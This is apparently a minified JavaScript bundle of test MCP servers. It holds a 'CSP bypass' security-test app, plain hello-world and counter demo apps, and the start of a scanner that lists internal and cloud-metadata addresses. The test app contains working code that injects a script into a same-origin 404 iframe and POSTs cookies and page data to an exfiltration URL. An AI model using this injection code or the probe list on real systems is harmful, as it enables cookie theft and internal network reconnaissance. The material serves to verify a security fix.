Embed an iframe pointing to a 404 page\n2. Inject a script into that iframe (same-origin)\n3. Use the (previously) CSP-free context to exfiltrate data\n\nWith the security fix applied, step 3 should be BLOCKED by CSP."}]}:{content:[{type:"text",text:"Unknown tool: ".concat(n)}],isError:!0}}),e.setRequestHandler(m.OI,()=>({resources:[{uri:v,name:"CSP Bypass Test MCP App",description:"[SECURITY TEST] Demonstrates CSP bypass via 404 iframe injection",mimeType:"text/html;profile=mcp-app"}]})),e.setRequestHandler(m.R6,e=>{let{uri:n}=e.params;if(n===v)return{contents:[{uri:v,mimeType:"text/html;profile=mcp-app",text:'<!DOCTYPE html>\n<html lang="en">\n<head>\n  <meta charset="UTF-8" />\n  <meta name="viewport" content="width=device-width, initial-scale=1.0" />\n  <title>CSP Bypass Test via 404 Iframe</title>\n  <style>\n    * { box-sizing: border-box; margin: 0; padding: 0; }\n    body {\n      font-family: system-ui, -apple-system, sans-serif;\n      padding: 1rem;\n      background: transparent;\n    }\n    .container { max-width: 700px; }\n    h1 {\n      font-size: 1.25rem;\n      margin-bottom: 0.5rem;\n      color: #dc2626;\n    }\n    .warning {\n      background: #fef2f2;\n      border: 1px solid #dc2626;\n      padding: 0.75rem;\n      border-radius: 6px;\n      margin-bottom: 1rem;\n      font-size: 0.875rem;\n      color: #991b1b;\n    }\n    .info-box {\n      background: #f0f9ff;\n      border: 1px solid #0284c7;\n      padding: 0.75rem;\n      border-radius: 6px;\n      margin-bottom: 1rem;\n      font-size: 0.8rem;\n      color: #0369a1;\n    }\n    .controls {\n      margin-bottom: 1rem;\n      padding: 0.75rem;\n      background: #f3f4f6;\n      border-radius: 6px;\n    }\n    .controls button {\n      padding: 0.5rem 1rem;\n      background: #dc2626;\n      color: white;\n      border: none;\n      border-radius: 4px;\n      cursor: pointer;\n      font-size: 0.875rem;\n      margin-right: 0.5rem;\n    }\n    .controls button:hover { background: #b91c1c; }\n    .controls button.secondary {\n      background: #6b7280;\n    }\n    .controls button.secondary:hover { background: #4b5563; }\n    .results {\n      font-family: monospace;\n      font-size: 0.7rem;\n      background: #1a1a1a;\n      color: #22c55e;\n      padding: 1rem;\n      border-radius: 6px;\n      max-height: 400px;\n      overflow-y: auto;\n    }\n    .log-entry {\n      margin-bottom: 0.2rem;\n      white-space: pre-wrap;\n      word-break: break-all;\n    }\n    .log-entry.error { color: #ef4444; }\n    .log-entry.success { color: #22c55e; }\n    .log-entry.blocked { color: #f59e0b; }\n    .log-entry.info { color: #60a5fa; }\n    .log-entry.header { color: #a78bfa; font-weight: bold; }\n    .summary {\n      margin-top: 1rem;\n      padding: 0.75rem;\n      border-radius: 6px;\n      font-size: 0.875rem;\n    }\n    .summary.vulnerable {\n      background: #fef2f2;\n      border: 2px solid #dc2626;\n      color: #991b1b;\n    }\n    .summary.secure {\n      background: #f0fdf4;\n      border: 2px solid #22c55e;\n      color: #166534;\n    }\n    #hidden-iframe {\n      display: none;\n    }\n  </style>\n</head>\n<body>\n  <div class="container">\n    <h1>⚠️ CSP Bypass via 404 Iframe Injection</h1>\n\n    <div class="warning">\n      <strong>Security Test:</strong> This demonstrates how missing CSP on 404 pages\n      allows attackers to bypass connect-src restrictions and exfiltrate data.\n      <br><br>\n      <strong>⚠️ IMPORTANT:</strong> This vulnerability can ONLY be reproduced on\n      <code>staging.claudemcpcontent.com</code> or <code>claudemcpcontent.com</code>,\n      NOT on localhost. In development, all routes get CSP headers via <code>generateCsp()</code>.\n    </div>\n\n    <div class="info-box">\n      <strong>Attack Flow:</strong><br>\n      1. This MCP App has CSP with connect-src that blocks external fetches<br>\n      2. We embed an iframe pointing to a 404 page on the same origin<br>\n      3. Same-origin access lets us inject a script into that iframe<br>\n      4. The 404 page (before fix) has NO CSP → script can fetch anywhere<br>\n      5. → Data exfiltration bypasses the MCP App\'s CSP restrictions\n    </div>\n\n    <div class="controls">\n      <button id="runTestBtn">Run CSP Bypass Test</button>\n      <button id="directFetchBtn" class="secondary">Direct Fetch (Control)</button>\n    </div>\n\n    <div class="results" id="results">\n      <div class="log-entry info">[*] CSP Bypass Test ready. Click "Run CSP Bypass Test" to begin.</div>\n      <div class="log-entry info">[*] "Direct Fetch" tests fetch from THIS context (should be blocked by CSP).</div>\n    </div>\n\n    <div class="summary" id="summary" style="display: none;"></div>\n  </div>\n\n  \x3c!-- Hidden iframe for the attack --\x3e\n  <iframe id="hidden-iframe"></iframe>\n\n  <script type="module">\n'.concat('\n    const app = (() => {\n      let nextId = 1;\n\n      return {\n        sendRequest({ method, params }) {\n          const id = nextId++;\n          window.parent.postMessage({ jsonrpc: "2.0", id, method, params }, "*");\n          return new Promise((resolve, reject) => {\n            window.addEventListener("message", function listener(event) {\n              const data = event.data;\n              if (event.data?.id === id) {\n                window.removeEventListener("message", listener);\n                if (event.data?.result) {\n                  resolve(event.data.result);\n                } else if (event.data?.error) {\n                  reject(new Error(event.data.error));\n                }\n              }\n            });\n          });\n        },\n        sendNotification({ method, params }) {\n          window.parent.postMessage({ jsonrpc: "2.0", method, params }, "*");\n        },\n        onNotification(method, handler) {\n          window.addEventListener("message", function listener(event) {\n            if (event.data?.method === method) {\n              handler(event.data.params);\n            }\n          });\n        },\n        setupAutoResize() {\n          new ResizeObserver(() => {\n            const { body, documentElement: html } = document;\n            const htmlStyle = getComputedStyle(html);\n            const rect = body.getBoundingClientRect();\n            const width = Math.ceil(rect.width);\n            const height = Math.ceil(\n              rect.height +\n              (parseFloat(htmlStyle.borderTop) || 0) +\n              (parseFloat(htmlStyle.borderBottom) || 0)\n            );\n            this.sendNotification({\n              method: "ui/notifications/size-changed",\n              params: { width, height }\n            });\n          }).observe(document.body);\n        },\n      };\n    })();\n','\n    const IMPLEMENTATION = { name: "CSP Bypass Test", version: "1.0.0" };\n    const EXFIL_URL = "').concat(x,'";\n\n    const resultsEl = document.getElementById("results");\n    const summaryEl = document.getElementById("summary");\n    const hiddenIframe = document.getElementById("hidden-iframe");\n    const runTestBtn = document.getElementById("runTestBtn");\n    const directFetchBtn = document.getElementById("directFetchBtn");\n\n    function log(message, type = "info") {\n      const entry = document.createElement("div");\n      entry.className = "log-entry " + type;\n      const timestamp = new Date().toISOString().substr(11, 8);\n      entry.textContent = "[" + timestamp + "] " + message;\n      resultsEl.appendChild(entry);\n      resultsEl.scrollTop = resultsEl.scrollHeight;\n    }\n\n    function logHeader(message) {\n      log("\\n" + "=".repeat(60), "header");\n      log(message, "header");\n      log("=".repeat(60), "header");\n    }\n\n    function showSummary(isVulnerable) {\n      summaryEl.style.display = "block";\n      if (isVulnerable) {\n        summaryEl.className = "summary vulnerable";\n        summaryEl.innerHTML =\n          "<strong>⚠️ VULNERABLE:</strong> CSP bypass successful! " +\n          "Data exfiltration was possible via 404 iframe injection. " +\n          "The security fix is NOT applied or not working.";\n      } else {\n        summaryEl.className = "summary secure";\n        summaryEl.innerHTML =\n          "<strong>✅ SECURE:</strong> CSP bypass blocked! " +\n          "The 404 page now has CSP that prevents script execution. " +\n          "The security fix is working correctly.";\n      }\n    }\n\n    // Control test: Direct fetch from THIS context (should be blocked by our CSP)\n    directFetchBtn.addEventListener("click", async () => {\n      logHeader("CONTROL TEST: Direct Fetch from MCP App Context");\n      log("[*] Attempting fetch to " + EXFIL_URL, "info");\n      log("[*] This SHOULD be blocked by our CSP\'s connect-src", "info");\n\n      try {\n        const resp = await fetch(EXFIL_URL, {\n          method: "POST",\n          body: JSON.stringify({ test: "direct-fetch", data: "sensitive-info" }),\n          headers: { "Content-Type": "application/json" },\n        });\n        const text = await resp.text();\n        log("[!] UNEXPECTED: Direct fetch succeeded!", "success");\n        log("[!] Response: " + text.substring(0, 100), "success");\n      } catch (e) {\n        if (e.message.includes("Content Security Policy") ||\n            e.message.includes("connect-src") ||\n            e.message.includes("Refused to connect")) {\n          log("[+] EXPECTED: Blocked by CSP - " + e.message.substring(0, 80), "blocked");\n        } else {\n          log("[-] Error: " + e.message, "error");\n        }\n      }\n    });\n\n    // Main attack test\n    runTestBtn.addEventListener("click", async () => {\n      resultsEl.innerHTML = "";\n      summaryEl.style.display = "none";\n\n      logHeader("CSP BYPASS ATTACK via 404 IFRAME INJECTION");\n\n      // Check if we\'re on localhost (development) - vulnerability won\'t repro\n      if (window.location.hostname === "localhost" || window.location.hostname === "127.0.0.1") {\n        log("[!] WARNING: Running on localhost - vulnerability cannot be reproduced!", "error");\n        log("[!] In development, all routes get CSP via generateCsp().", "error");\n        log("[!] Test on staging.claudemcpcontent.com to reproduce the vulnerability.", "error");\n        log("", "info");\n      }\n\n      // Step 1: Load a 404 page in the hidden iframe\n      log("[1] Loading 404 page in hidden iframe...", "info");\n      log("    URL: /csp-bypass-test-nonexistent-" + Date.now(), "info");\n\n      const iframeSrc = "/csp-bypass-test-nonexistent-" + Date.now();\n\n      await new Promise((resolve, reject) => {\n        hiddenIframe.onload = resolve;\n        hiddenIframe.onerror = reject;\n        hiddenIframe.src = iframeSrc;\n        // Timeout after 5 seconds\n        setTimeout(() => reject(new Error("Iframe load timeout")), 5000);\n      }).catch(e => {\n        log("[-] Iframe load issue: " + e.message, "error");\n      });\n\n      log("[+] Iframe loaded (404 page)", "info");\n\n      // Step 2: Try to access the iframe document (same-origin)\n      log("[2] Attempting same-origin access to iframe document...", "info");\n\n      let iframeDoc;\n      try {\n        iframeDoc = hiddenIframe.contentDocument || hiddenIframe.contentWindow.document;\n        if (!iframeDoc) {\n          throw new Error("Could not access iframe document");\n        }\n        log("[+] Same-origin access successful!", "info");\n        log("    Document title: " + (iframeDoc.title || "(empty)"), "info");\n      } catch (e) {\n        log("[-] Cannot access iframe: " + e.message, "error");\n        log("[-] Attack failed at step 2", "error");\n        showSummary(false);\n        return;\n      }\n\n      // Step 3: Inject a script into the 404 page\n      log("[3] Injecting exfiltration script into 404 iframe...", "info");\n\n      // Create a promise to wait for the injected script\'s result\n      const resultPromise = new Promise((resolve) => {\n        // Listen for postMessage from the injected script\n        const handler = (event) => {\n          if (event.data && event.data.type === "csp-bypass-result") {\n            window.removeEventListener("message", handler);\n            resolve(event.data);\n          }\n        };\n        window.addEventListener("message", handler);\n\n        // Timeout after 10 seconds\n        setTimeout(() => resolve({ type: "csp-bypass-result", success: false, error: "timeout" }), 10000);\n      });\n\n      try {\n        const script = iframeDoc.createElement("script");\n        script.textContent = `\n          // This script runs in the 404 page context\n          // Before the fix: No CSP, so fetch() can go anywhere\n          // After the fix: CSP blocks script execution entirely\n\n          (async function() {\n            const EXFIL_URL = "${EXFIL_URL}";\n            const sensitiveData = {\n              attack: "csp-bypass-via-404-iframe",\n              timestamp: new Date().toISOString(),\n              location: window.location.href,\n              cookie: document.cookie || "(no cookies)",\n              localStorage: Object.keys(localStorage).length + " items",\n            };\n\n            try {\n              const resp = await fetch(EXFIL_URL, {\n                method: "POST",\n                body: JSON.stringify(sensitiveData),\n                headers: { "Content-Type": "application/json" },\n                mode: "cors",\n              });\n\n              if (resp.ok) {\n                const text = await resp.text();\n                // Report success back to parent\n                window.parent.postMessage({\n                  type: "csp-bypass-result",\n                  success: true,\n                  response: text.substring(0, 200)\n                }, "*");\n              } else {\n                window.parent.postMessage({\n                  type: "csp-bypass-result",\n                  success: false,\n                  error: "HTTP " + resp.status\n                }, "*");\n              }\n            } catch (e) {\n              window.parent.postMessage({\n                type: "csp-bypass-result",\n                success: false,\n                error: e.message\n              }, "*");\n            }\n          })();\n        `;\n\n        iframeDoc.body.appendChild(script);\n        log("[+] Script injected into 404 iframe", "info");\n      } catch (e) {\n        log("[-] Script injection failed: " + e.message, "error");\n        // Script injection blocked by CSP = fix is working\n        if (e.message.includes("Content Security Policy") ||\n            e.message.includes("script-src") ||\n            e.message.includes("Refused to execute")) {\n          log("[+] CSP blocked script injection - FIX IS WORKING!", "blocked");\n          showSummary(false);\n          return;\n        }\n        showSummary(false);\n        return;\n      }\n\n      // Step 4: Wait for the result\n      log("[4] Waiting for exfiltration attempt result...", "info");\n\n      const result = await resultPromise;\n\n      if (result.success) {\n        logHeader("ATTACK SUCCESSFUL - CSP BYPASSED!");\n        log("[!] Data exfiltration succeeded!", "success");\n        log("[!] Response from exfil endpoint:", "success");\n        log("    " + result.response, "success");\n        log("", "success");\n        log("[!] This means the security fix is NOT applied!", "success");\n        showSummary(true);\n      } else {\n        logHeader("ATTACK BLOCKED");\n        if (result.error === "timeout") {\n          log("[+] Script execution timed out (likely blocked by CSP)", "blocked");\n        } else if (result.error.includes("Content Security Policy") ||\n                   result.error.includes("connect-src") ||\n                   result.error.includes("Refused")) {\n          log("[+] CSP blocked the exfiltration attempt", "blocked");\n          log("    Error: " + result.error, "blocked");\n        } else {\n          log("[-] Unexpected error: " + result.error, "error");\n        }\n        log("", "info");\n        log("[+] The security fix appears to be working!", "blocked");\n        showSummary(false);\n      }\n    });\n\n    // MCP App connection\n    let nextRequestId = 1;\n\n    async function connectToHost() {\n      try {\n        window.addEventListener("message", (event) => {\n          try {\n            const data = event.data;\n            if (data && data.jsonrpc === "2.0") {\n              if (data.id === 1 && data.result) {\n                const initializedNotification = {\n                  jsonrpc: "2.0",\n                  method: "ui/notifications/initialized",\n                  params: {}\n                };\n                window.parent.postMessage(initializedNotification, "*");\n              }\n            }\n          } catch (err) {\n            console.error("[CspBypassTest] Error handling message:", err);\n          }\n        });\n\n        app.onNotification("ui/notifications/tool-input", (params) => {\n          const args = params?.arguments || {};\n\n          // Auto-run test on tool invocation\n          setTimeout(() => {\n            runTestBtn.click();\n          }, 500);\n        });\n\n        const initRequest = {\n          jsonrpc: "2.0",\n          id: nextRequestId++,\n          method: "ui/initialize",\n          params: {\n            protocolVersion: "2025-11-21",\n            appInfo: IMPLEMENTATION,\n            appCapabilities: {}\n          }\n        };\n        window.parent.postMessage(initRequest, "*");\n        app.setupAutoResize();\n\n      } catch (err) {\n        console.error("[CspBypassTest] Failed to connect:", err);\n      }\n    }\n\n    connectToHost();\n  <\/script>\n</body>\n</html>'),_meta:{ui:{csp:{connectDomains:[]}}}}]};throw Error("Unknown resource: ".concat(n))}),e}let C="ui/resourceUri",S="ui://mcp-apps-example/hello-world.html",E="ui://mcp-apps-example/counter.html";var T=function(e){return e.MCP_APPS_HELLO="mcp_apps_hello",e.MCP_APPS_COUNTER="mcp_apps_counter",e}(T||{});let _='\n    const app = (() => {\n      let nextId = 1;\n\n      return {\n        sendRequest({ method, params }) {\n          const id = nextId++;\n          window.parent.postMessage({ jsonrpc: "2.0", id, method, params }, "*");\n          return new Promise((resolve, reject) => {\n            window.addEventListener("message", function listener(event) {\n              const data = event.data;\n              if (event.data?.id === id) {\n                window.removeEventListener("message", listener);\n                if (event.data?.result) {\n                  resolve(event.data.result);\n                } else if (event.data?.error) {\n                  reject(new Error(event.data.error));\n                }\n              } else {\n                reject(new Error(`Unsupported message: ${JSON.stringify(data)}`));\n              }\n            });\n          });\n        },\n        sendNotification({ method, params }) {\n          window.parent.postMessage({ jsonrpc: "2.0", method, params }, "*");\n        },\n        onNotification(method, handler) {\n          window.addEventListener("message", function listener(event) {\n            if (event.data?.method === method) {\n              handler(event.data.params);\n            }\n          });\n        },\n        setupAutoResize() {\n          new ResizeObserver(() => {\n            const { body, documentElement: html } = document;\n            const htmlStyle = getComputedStyle(html);\n\n            // getBoundingClientRect returns fractional values (unlike scrollHeight)\n            const rect = body.getBoundingClientRect();\n\n            const width = Math.ceil(rect.width);\n            const height = Math.ceil(\n              rect.height +\n              (parseFloat(htmlStyle.borderTop) || 0) +\n              (parseFloat(htmlStyle.borderBottom) || 0)\n            );\n\n            this.sendNotification({\n              method: "ui/notifications/size-changed",\n              params: { width, height }\n            });\n          }).observe(document.body);\n        },\n      };\n    })();\n';function P(){let e=new u.g({name:"MCP Apps Example",version:"1.0.0"},{capabilities:{tools:{},resources:{}},jsonSchemaValidator:l.hm});return e.setRequestHandler(m.gW,()=>({tools:[{name:"mcp_apps_hello",description:"Demonstrates MCP Apps - returns an interactive UI that greets the user",inputSchema:{type:"object",properties:{name:{type:"string",description:"Name to greet"}}},_meta:{[C]:S}},{name:"mcp_apps_counter",description:"Demonstrates MCP Apps with an interactive counter UI. The user can increment/decrement the counter.",inputSchema:{type:"object",properties:{initialValue:{type:"number",description:"Initial counter value",default:0}}},_meta:{[C]:E}}]})),e.setRequestHandler(m.FT,e=>{let{name:n,arguments:t}=e.params;if("mcp_apps_hello"===n){let e=null==t?void 0:t.name;return{content:[{type:"text",text:"Greeting: ".concat(e?"Hello, ".concat(e,"!"):"Hello, World!",". If your client supports MCP Apps, an interactive UI should have rendered.")}]}}if("mcp_apps_counter"===n){var r;let e=null!=(r=null==t?void 0:t.initialValue)?r:0;return{content:[{type:"text",text:"Counter initialized to ".concat(e,". If your client supports MCP Apps, an interactive counter UI should have rendered.")}]}}return{content:[{type:"text",text:"Unknown tool: ".concat(n)}],isError:!0}}),e.setRequestHandler(m.OI,()=>({resources:[{uri:S,name:"Hello World MCP App",description:"Interactive greeting UI for the mcp_apps_hello tool",mimeType:"text/html;profile=mcp-app"},{uri:E,name:"Counter MCP App",description:"Interactive counter UI for the mcp_apps_counter tool",mimeType:"text/html;profile=mcp-app"}]})),e.setRequestHandler(m.R6,e=>{let{uri:n}=e.params;if(n===S)return{contents:[{uri:S,mimeType:"text/html;profile=mcp-app",text:'<!DOCTYPE html>\n<html lang="en">\n<head>\n  <meta charset="UTF-8" />\n  <meta name="viewport" content="width=device-width, initial-scale=1.0" />\n  <title>Hello World MCP App</title>\n  <style>\n    * { box-sizing: border-box; margin: 0; padding: 0; }\n    body {\n      font-family: system-ui, -apple-system, sans-serif;\n      padding: 1rem;\n      background: transparent;\n    }\n    .container {\n      max-width: 400px;\n    }\n    h1 {\n      font-size: 1.25rem;\n      margin-bottom: 0.75rem;\n      color: #1a1a1a;\n    }\n    .greeting {\n      font-size: 1.5rem;\n      padding: 1rem;\n      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);\n      color: white;\n      border-radius: 8px;\n      text-align: center;\n      margin-bottom: 1rem;\n    }\n    .input-row {\n      display: flex;\n      gap: 0.5rem;\n      margin-bottom: 1rem;\n    }\n    input {\n      flex: 1;\n      padding: 0.5rem 0.75rem;\n      border: 1px solid #ddd;\n      border-radius: 6px;\n      font-size: 0.875rem;\n    }\n    input:focus {\n      outline: none;\n      border-color: #667eea;\n    }\n    button {\n      padding: 0.5rem 1rem;\n      background: #667eea;\n      color: white;\n      border: none;\n      border-radius: 6px;\n      cursor: pointer;\n      font-size: 0.875rem;\n    }\n    button:hover {\n      background: #5a67d8;\n    }\n    .info {\n      font-size: 0.75rem;\n      color: #666;\n    }\n    .tool-input {\n      margin-top: 1rem;\n      padding: 0.75rem;\n      background: #f5f5f5;\n      border-radius: 6px;\n      font-size: 0.75rem;\n    }\n    .tool-input pre {\n      white-space: pre-wrap;\n      word-break: break-all;\n    }\n  </style>\n</head>\n<body>\n  <div class="container" id="app">\n    <h1>Hello World MCP App</h1>\n    <div class="greeting" id="greeting">Hello, World!</div>\n    <div class="input-row">\n      <input type="text" id="nameInput" placeholder="Enter a name..." />\n      <button id="greetBtn">Greet</button>\n    </div>\n    <p class="info">Type a name and click Greet to update the greeting.</p>\n    <div class="tool-input" id="toolInputDisplay" style="display: none;">\n      <strong>Tool Input:</strong>\n      <pre id="toolInputContent"></pre>\n    </div>\n  </div>\n\n  <script type="module">\n'.concat(_,'\n    const IMPLEMENTATION = { name: "Hello World App", version: "1.0.0" };\n\n    // State\n    let currentName = "World";\n\n    // DOM elements\n    const greetingEl = document.getElementById("greeting");\n    const nameInput = document.getElementById("nameInput");\n    const greetBtn = document.getElementById("greetBtn");\n    const toolInputDisplay = document.getElementById("toolInputDisplay");\n    const toolInputContent = document.getElementById("toolInputContent");\n\n    // Update greeting\n    function updateGreeting(name) {\n      currentName = name || "World";\n      greetingEl.textContent = "Hello, " + currentName + "!";\n    }\n\n    // Handle button click\n    greetBtn.addEventListener("click", () => {\n      updateGreeting(nameInput.value);\n      nameInput.value = "";\n    });\n\n    // Handle enter key\n    nameInput.addEventListener("keypress", (e) => {\n      if (e.key === "Enter") {\n        updateGreeting(nameInput.value);\n        nameInput.value = "";\n      }\n    });\n\n    // MCP App connection\n    let nextRequestId = 1;\n\n    async function connectToHost() {\n      try {\n        // Listen for messages from parent\n        window.addEventListener("message", (event) => {\n          try {\n            const data = event.data;\n            if (data && data.jsonrpc === "2.0") {\n              // Handle initialize response - send initialized notification to complete handshake\n              if (data.id === 1 && data.result) {\n                const initializedNotification = {\n                  jsonrpc: "2.0",\n                  method: "ui/notifications/initialized",\n                  params: {}\n                };\n                window.parent.postMessage(initializedNotification, "*");\n              }\n            }\n          } catch (err) {\n            console.error("[HelloWorldApp] Error handling message:", err);\n          }\n        });\n\n        // Register notification handlers\n        app.onNotification("ui/notifications/tool-input", (params) => {\n          const args = params?.arguments || {};\n          toolInputDisplay.style.display = "block";\n          toolInputContent.textContent = JSON.stringify(args, null, 2);\n          if (args.name) {\n            updateGreeting(args.name);\n          }\n        });\n\n        app.onNotification("ui/notifications/tool-result", (params) => {\n          console.log("[HelloWorldApp] Tool result:", params);\n        });\n\n        app.onNotification("ui/notifications/host-context-changed", (params) => {\n          console.log("[HelloWorldApp] Host context changed:", params);\n        });\n\n        // Send initialize request\n        const initRequest = {\n          jsonrpc: "2.0",\n          id: nextRequestId++,\n          method: "ui/initialize",\n          params: {\n            protocolVersion: "2025-11-21",\n            appInfo: IMPLEMENTATION,\n            appCapabilities: {}\n          }\n        };\n        window.parent.postMessage(initRequest, "*");\n        app.setupAutoResize();\n      } catch (err) {\n        console.error("[HelloWorldApp] Failed to connect:", err);\n      }\n    }\n\n    // Connect when page loads\n    connectToHost();\n  <\/script>\n</body>\n</html>')}]};if(n===E)return{contents:[{uri:E,mimeType:"text/html;profile=mcp-app",text:'<!DOCTYPE html>\n<html lang="en">\n<head>\n  <meta charset="UTF-8" />\n  <meta name="viewport" content="width=device-width, initial-scale=1.0" />\n  <title>Counter MCP App</title>\n  <style>\n    * { box-sizing: border-box; margin: 0; padding: 0; }\n    body {\n      font-family: system-ui, -apple-system, sans-serif;\n      padding: 1rem;\n      background: transparent;\n    }\n    .container {\n      max-width: 300px;\n      text-align: center;\n    }\n    h1 {\n      font-size: 1.25rem;\n      margin-bottom: 1rem;\n      color: #1a1a1a;\n    }\n    .counter-display {\n      font-size: 3rem;\n      font-weight: bold;\n      padding: 1.5rem;\n      background: linear-gradient(135deg, #11998e 0%, #38ef7d 100%);\n      color: white;\n      border-radius: 12px;\n      margin-bottom: 1rem;\n      min-width: 150px;\n      display: inline-block;\n    }\n    .buttons {\n      display: flex;\n      gap: 0.5rem;\n      justify-content: center;\n      margin-bottom: 1rem;\n    }\n    button {\n      width: 50px;\n      height: 50px;\n      font-size: 1.5rem;\n      border: none;\n      border-radius: 50%;\n      cursor: pointer;\n      transition: transform 0.1s;\n    }\n    button:hover {\n      transform: scale(1.1);\n    }\n    button:active {\n      transform: scale(0.95);\n    }\n    .decrement {\n      background: #ff6b6b;\n      color: white;\n    }\n    .increment {\n      background: #4ecdc4;\n      color: white;\n    }\n    .reset {\n      background: #95a5a6;\n      color: white;\n      font-size: 0.75rem;\n      width: 60px;\n      height: 30px;\n      border-radius: 15px;\n    }\n    .info {\n      font-size: 0.75rem;\n      color: #666;\n      margin-top: 0.5rem;\n    }\n  </style>\n</head>\n<body>\n  <div class="container">\n    <h1>Counter</h1>\n    <div class="counter-display" id="counter">0</div>\n    <div class="buttons">\n      <button class="decrement" id="decrementBtn">-</button>\n      <button class="increment" id="incrementBtn">+</button>\n    </div>\n    <button class="reset" id="resetBtn">Reset</button>\n    <p class="info">Click the buttons to change the counter value.</p>\n  </div>\n\n  <script type="module">\n'.concat(_,'\n    const IMPLEMENTATION = { name: "Counter App", version: "1.0.0" };\n\n    // State\n    let count = 0;\n    let initialValue = 0;\n\n    // DOM elements\n    const counterEl = document.getElementById("counter");\n    const incrementBtn = document.getElementById("incrementBtn");\n    const decrementBtn = document.getElementById("decrementBtn");\n    const resetBtn = document.getElementById("resetBtn");\n\n    // Update display\n    function updateDisplay() {\n      counterEl.textContent = count;\n      // Add color animation based on value\n      if (count > 0) {\n        counterEl.style.background = "linear-gradient(135deg, #11998e 0%, #38ef7d 100%)";\n      } else if (count < 0) {\n        counterEl.style.background = "linear-gradient(135deg, #ff6b6b 0%, #ee5a5a 100%)";\n      } else {\n        counterEl.style.background = "linear-gradient(135deg, #667eea 0%, #764ba2 100%)";\n      }\n    }\n\n    // Update widget context with current counter value\n    function updateWidgetContext() {\n      app.sendRequest({\n        method: "ui/update-model-context",\n        params: {\n          content: [\n            {\n              type: "text",\n              text: "Counter is at " + count,\n            },\n          ],\n        },\n      }).catch((err) => {\n        console.error("[CounterApp] Failed to update widget context:", err);\n      });\n    }\n\n    // Event listeners\n    incrementBtn.addEventListener("click", () => {\n      count++;\n      updateDisplay();\n      updateWidgetContext();\n    });\n\n    decrementBtn.addEventListener("click", () => {\n      count--;\n      updateDisplay();\n      updateWidgetContext();\n    });\n\n    resetBtn.addEventListener("click", () => {\n      count = initialValue;\n      updateDisplay();\n      updateWidgetContext();\n    });\n\n    // MCP App connection\n    let nextRequestId = 1;\n\n    async function connectToHost() {\n      try {\n        // Listen for messages from parent\n        window.addEventListener("message", (event) => {\n          try {\n            const data = event.data;\n            if (data && data.jsonrpc === "2.0") {\n              // Handle initialize response - send initialized notification to complete handshake\n              if (data.id === 1 && data.result) {\n                const initializedNotification = {\n                  jsonrpc: "2.0",\n                  method: "ui/notifications/initialized",\n                  params: {}\n                };\n                window.parent.postMessage(initializedNotification, "*");\n              }\n            }\n          } catch (err) {\n            console.error("[CounterApp] Error handling message:", err);\n          }\n        });\n\n        // Register notification handlers\n        app.onNotification("ui/notifications/tool-input", (params) => {\n          const args = params?.arguments || {};\n          if (typeof args.initialValue === "number") {\n            initialValue = args.initialValue;\n            count = initialValue;\n            updateDisplay();\n          }\n        });\n\n        app.onNotification("ui/notifications/tool-result", (params) => {\n          console.log("[CounterApp] Tool result:", params);\n        });\n\n        app.onNotification("ui/notifications/host-context-changed", (params) => {\n          console.log("[CounterApp] Host context changed:", params);\n        });\n\n        // Send initialize request\n        const initRequest = {\n          jsonrpc: "2.0",\n          id: nextRequestId++,\n          method: "ui/initialize",\n          params: {\n            protocolVersion: "2025-11-21",\n            appInfo: IMPLEMENTATION,\n            appCapabilities: {}\n          }\n        };\n        window.parent.postMessage(initRequest, "*");\n        app.setupAutoResize();\n      } catch (err) {\n        console.error("[CounterApp] Failed to connect:", err);\n      }\n    }\n\n    // Initialize\n    updateDisplay();\n    connectToHost();\n  <\/script>\n</body>\n</html>')}]};throw Error("Unknown resource: ".concat(n))}),e}let I="ui://mcp-apps-security-test/scanner.html";var A=function(e){return e.SECURITY_TEST_SCANNER="security_test_scanner",e}(A||{});let R=["http://localhost:3000","http://localhost:3001","http://localhost:4040","http://localhost:5432","http://localhost:6379","http://localhost:8080","http://localhost:8888","https://localhost:443","http://127.0.0.1:3000","http://127.0.0.1:8080","http://127.1.2.3:80","http://127.255.255.255:80","http://10.0.0.1:80","http://10.1.2.3:8080","http://10.255.255.255:80","http://172.16.0.1:80","http://172.20.30.40:8080","http://172.31.255.255:80","http://192.168.0.1:80","http://192.168.1.1:80","http://192.168.1.100:8080","http://192.168.255.255:80","http://169.254.0.1:80","http://169.254.169.254:80","http://169.254.255.255:80","http://0.0.0.0:80","http://0.0.0.0:8080","http://100.64.0.1:80","http://100.100.100.100:80","http://100.127.255.255:80","http://[::1]:80","http://[::1]:8080","http://[0:0:0:0:0:0:0:1]:80","http://[fe80::1]:80","http://[fe80::1234:5678]:80","http://[fe90::1]:80","http://[fea0::1]:80","http://[feb0::1]:80","http://[fc00::1]:80","http://[fd00::1]:80","http://[fd12:3456:789a::1]:80","http://[fdff:ffff:ffff:ffff::1]:80","http://[::ffff:127.0.0.1]:80","http://[::ffff:10.0.0.1]:80","http://[::ffff:192.168.1.1]:80","http://[::ffff:169.254.169.254]:80","http://server.local:80","http://myprinter.local:80","http://raspberrypi.local:80","http://app.localhost:3000","http://dev.localhost:8080","http://api.internal:80","http://db.internal:5432","http://service.corp.internal:80","http://router.home.arpa:80","http://nas.home.arpa:80","http://server.localdomain:80","http://myhost.lan:80","http://wiki.intranet:80","https://httpbin.org"],B=[{url:"http://localhost:3000/",name:"localhost:3000 (Dev Server)"},{url:"http://localhost:8080/",name:"localhost:8080 (HTTP Alt)"},{url:"http://localhost:5432/",name:"localhost:5432 (PostgreSQL)"},{url:"http://127.0.0.1:3000/",name:"127.0.0.1:3000 (Loopback)"},{url:"http://127.0.0.1:8080/",name:"127.0.0.1:8080 (Loopback)"},{url:"http://10.0.0.1:80/",name:"10.0.0.1 (Class A Private)"},{url:"http://172.16.0.1:80/",name:"172.16.0.1 (Class B Private)"},{url:"http://192.168.1.1:80/",name:"192.168.1.1 (Router/Gateway)"},{url:"http://192.168.1.100:80/",name:"192.168.1.100 (LAN Device)"},{url:"http://169.254.169.254/latest/meta-data/",name:"AWS Metadata"},{url:"http://169.254.169.254/computeMetadata/v1/",name:"GCP Metadata"},{url:"http://100.64.0.1:80/",name:"100.64.0.1 (CGNAT)"},{url:"http://100.100.100.100:80/",name:"100.100.100.100 (CGNAT)"},{url:"http://[::1]:80/",name:"[::1] (IPv6 Loopback)"},{url:"http://[::1]:8080/",name:"[::1]:8080 (IPv6 Loopback)"},{url:"http://[fe80::1]:80/",name:"[fe80::1] (IPv6 Link-local)"},{url:"http://[fd00::1]:80/",name:"[fd00::1] (IPv6 ULA)"},{url:"http://[::ffff:127.0.0.1]:80/",name:"[::ffff:127.0.0.1] 